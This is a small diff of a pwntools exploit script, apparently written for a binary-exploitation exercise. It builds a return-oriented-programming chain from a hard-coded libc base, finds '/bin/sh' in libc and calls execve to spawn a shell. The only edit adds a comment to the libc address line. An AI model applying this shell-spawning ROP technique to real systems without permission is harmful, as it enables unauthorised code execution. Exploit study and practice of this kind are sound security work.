@@ -6,7 +6,7 @@ libc = elf.libc
 rop = ROP([elf,libc])
 context.kernel = 'amd64'
 
-libc.address = 0x00007ffff7dd2000
+libc.address = 0x00007ffff7dd2000 # ldd program
 binsh = next(libc.search(b"/bin/sh"))
 rop.execve(binsh,0,0)
 
